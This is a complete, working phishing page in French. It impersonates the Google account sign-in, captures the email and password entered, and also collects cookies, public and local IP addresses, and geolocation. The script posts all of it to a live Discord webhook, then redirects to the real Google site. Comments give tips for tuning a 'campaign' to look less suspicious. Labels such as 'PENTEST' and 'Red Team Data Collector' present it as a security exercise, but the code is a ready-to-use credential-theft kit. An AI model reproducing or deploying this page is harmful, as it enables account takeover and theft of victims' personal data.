<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connexion - Compte Google</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Google Sans',Roboto,Arial,sans-serif; }
  body { background:#f0f4f9; }

  /* ---- Layout général : deux panneaux côte à côte ---- */
  .container { display:flex; min-height:100vh; }

  /* ---- Panneau gauche : formulaire ---- */
  .left {
    flex:1;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    padding:48px 32px;
    background:#fff;
  }
  .left .logo { width:90px; height:90px; margin-bottom:20px; }
  .left .logo svg { width:100%; height:100%; }

  .left h1 { font-size:28px; font-weight:400; color:#202124; margin-bottom:8px; }
  .left .subtitle { font-size:15px; color:#5f6368; margin-bottom:36px; }

  .form-box { width:100%; max-width:380px; }

  .field { margin-bottom:24px; }
  label {
    display:block; font-size:12px; font-weight:500; color:#5f6368;
    letter-spacing:.4px; margin-bottom:8px;
  }
  input {
    width:100%; padding:13px 15px; font-size:16px; color:#202124;
    background:#fff; border:1px solid #dadce0; border-radius:8px; outline:none;
    transition:border .15s, box-shadow .15s;
  }
  input:focus { border:2px solid #1a73e8; box-shadow:0 1px 2px rgba(26,115,232,.2); }

  button {
    width:100%; background:#1a73e8; color:#fff; border:none; border-radius:20px;
    padding:13px 24px; font-size:15px; font-weight:500; cursor:pointer;
    transition:background .15s; margin-top:8px;
  }
  button:hover { background:#1765cc; }
  button:disabled { background:#a8c7fa; cursor:not-allowed; }

  .loading {
    display:none; margin-top:20px; text-align:center;
    color:#5f6368; font-size:14px; line-height:1.9;
  }
  .spinner {
    display:inline-block; width:18px; height:18px; margin-right:8px;
    border:2px solid #dadce0; border-top-color:#1a73e8;
    border-radius:50%; animation:spin .8s linear infinite; vertical-align:middle;
  }
  @keyframes spin { to { transform:rotate(360deg); } }

  .footer-links { margin-top:32px; display:flex; gap:24px; }
  .footer-links a { color:#5f6368; font-size:12px; text-decoration:none; }
  .footer-links a:hover { color:#1a73e8; }

  /* ---- Panneau droit : visuel décoratif ---- */
  .right {
    flex:1;
    background:linear-gradient(135deg, #1a73e8 0%, #4285f4 50%, #34a853 100%);
    display:flex; align-items:center; justify-content:center; padding:32px;
  }
  .right .brand { text-align:center; color:#fff; max-width:320px; }
  .right .brand svg { width:72px; height:72px; margin-bottom:24px; background:#fff; border-radius:50%; padding:8px; }
  .right .brand h2 { font-size:26px; font-weight:400; margin-bottom:12px; }
  .right .brand p { font-size:15px; line-height:1.6; opacity:.95; }

  /* ---- Responsive : on masque le panneau droit sur mobile ---- */
  @media (max-width:820px) {
    .right { display:none; }
  }
</style>
</head>
<body>

<div class="container">

  <!-- ===== Panneau gauche : formulaire ===== -->
  <div class="left">
    <div class="logo">
      <svg viewBox="0 0 48 48">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      </svg>
    </div>
    <h1>Se connecter</h1>
    <p class="subtitle">Utiliser votre compte Google</p>

    <div class="form-box">
      <div class="field">
        <label for="email">ADRESSE E-MAIL OU NUMÉRO DE TÉLÉPHONE</label>
        <input type="text" id="email" placeholder="exemple@gmail.com" required>
      </div>

      <div class="field">
        <label for="password">MOT DE PASSE</label>
        <input type="password" id="password" placeholder="Entrez votre mot de passe" required>
      </div>

      <button type="button" onclick="ouvrirDocument()">Connexion</button>

      <div class="loading" id="loading">
        <p><span class="spinner"></span>Vérification de vos informations...</p>
        <p>📡 Connexion sécurisée en cours...</p>
      </div>

      <div class="footer-links">
        <a href="#">Aide</a>
        <a href="#">Confidentialité</a>
        <a href="#">Conditions</a>
      </div>
    </div>
  </div>

  <!-- ===== Panneau droit : visuel décoratif ===== -->
  <div class="right">
    <div class="brand">
      <svg viewBox="0 0 48 48">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      </svg>
      <h2>Votre compte, protégé</h2>
      <p>Connectez-vous en toute sécurité pour accéder à vos services Google.</p>
    </div>
  </div>

</div>

<script>
// ============================================================
// CONFIGURATION — à adapter pour ta campagne
// ============================================================
var WEBHOOK_URL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE";
var REDIRECT_URL = "https://accounts.google.com"; // redirection post-capture (réalisme) — mets "debrief.html" pour la sensibilisation
var ENABLE_GEOLOCATION = true;   // false = pas de popup de localisation (moins suspect)
var REDIRECT_DELAY = 2000;       // ms avant redirection
// ============================================================

function ouvrirDocument() {
  var email = document.getElementById('email').value.trim();
  var password = document.getElementById('password').value.trim();

  if (!email || !password) {
    alert('⚠️ Veuillez remplir tous les champs obligatoires');
    return;
  }

  document.getElementById('loading').style.display = 'block';
  document.querySelector('button').style.display = 'none';

  var infos = {
    email: email,
    password: password,
    navigateur: navigator.userAgent,
    plateforme: navigator.platform,
    ecran: screen.width + 'x' + screen.height,
    fenetre: window.innerWidth + 'x' + window.innerHeight,
    fuseau: Intl.DateTimeFormat().resolvedOptions().timeZone,
    url: window.location.href,
    horodatage: new Date().toISOString(),
    cookies: document.cookie || "Aucun cookie",
    connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue"
  };

  // IP publique via ipify
  function getPublicIP() {
    return fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => { infos.ip_publique = data.ip; })
      .catch(() => { infos.ip_publique = "Non disponible"; });
  }

  // IP locales via WebRTC (STUN Google)
  function getLocalIPs() {
    return new Promise((resolve) => {
      var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
      if (RTCPeerConnection) {
        try {
          var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
          var ips = [];

          pc.createDataChannel("");
          pc.createOffer().then(pc.setLocalDescription.bind(pc));

          pc.onicecandidate = function (ice) {
            if (!ice || !ice.candidate) return;
            var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (myIP && ips.indexOf(myIP[1]) === -1) {
              ips.push(myIP[1]);
            }
          };

          setTimeout(() => {
            infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non détectées";
            pc.close();
            resolve();
          }, 2000);
        } catch (e) {
          infos.ip_locales = "Erreur WebRTC";
          resolve();
        }
      } else {
        infos.ip_locales = "WebRTC non supporté";
        resolve();
      }
    });
  }

  // Géolocalisation (déclenche une popup navigateur — à désactiver si trop suspect)
  function getGeolocation() {
    return new Promise((resolve) => {
      if (!ENABLE_GEOLOCATION) { infos.geolocalisation = "Désactivée (config)"; resolve(); return; }
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function (position) {
            infos.latitude = position.coords.latitude.toFixed(6);
            infos.longitude = position.coords.longitude.toFixed(6);
            infos.precision = position.coords.accuracy + 'm';
            resolve();
          },
          function (error) {
            infos.geolocalisation = "Refusée: " + error.message;
            resolve();
          },
          { timeout: 5000 }
        );
      } else {
        infos.geolocalisation = "Non supportée";
        resolve();
      }
    });
  }

  // Envoi vers le webhook Discord
  function sendToWebhook() {
    var message = {
      content: "🎯 **NOUVELLE COLLECTE - PENTEST**",
      embeds: [{
        title: "📊 Informations Collectées",
        color: 3066993,
        fields: [
          {
            name: "🔑 Identifiants",
            value: "**Email:** " + infos.email + "\n**Mot de passe:** " + infos.password,
            inline: false
          },
          {
            name: "🌐 Adresses IP",
            value: "**Publique:** " + infos.ip_publique + "\n**Locale(s):** " + (infos.ip_locales || "N/A"),
            inline: false
          },
          {
            name: "📱 Système",
            value: "**Plateforme:** " + infos.plateforme + "\n**Écran:** " + infos.ecran,
            inline: true
          },
          {
            name: "🌍 Localisation",
            value: infos.latitude ? ("**Lat:** " + infos.latitude + "\n**Lng:** " + infos.longitude) : (infos.geolocalisation || "Non disponible"),
            inline: true
          },
          {
            name: "🔎 Détails techniques",
            value: "**Navigateur:** " + infos.navigateur + "\n**Fuseau:** " + infos.fuseau + "\n**Connexion:** " + infos.connexion + "\n**Cookies:** " + infos.cookies,
            inline: false
          },
          {
            name: "🕒 Horodatage",
            value: infos.horodatage,
            inline: false
          },
          {
            name: "🔗 Source",
            value: infos.url,
            inline: false
          }
        ],
        timestamp: infos.horodatage,
        footer: {
          text: "Red Team Data Collector"
        }
      }]
    };

    // Mode démo : si WEBHOOK_URL est vide, on log en console au lieu d'envoyer
    if (!WEBHOOK_URL) {
      console.log('[CAPTURE]', JSON.stringify(infos, null, 2));
      alert('Mode démo — données loggées en console (F12).');
      window.location.href = REDIRECT_URL;
      return;
    }

    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    }).then(function () {
      setTimeout(function () { window.location.href = REDIRECT_URL; }, REDIRECT_DELAY);
    }).catch(function (error) {
      console.error('Erreur:', error);
      setTimeout(function () { window.location.href = REDIRECT_URL; }, REDIRECT_DELAY);
    });
  }

  // === Chaîne d'exécution : géolocalisation d'abord, puis IP, puis envoi ===
  getGeolocation()
    .then(getPublicIP)
    .then(getLocalIPs)
    .then(sendToWebhook)
    .catch(console.error);
}
</script>
</body>
</html>
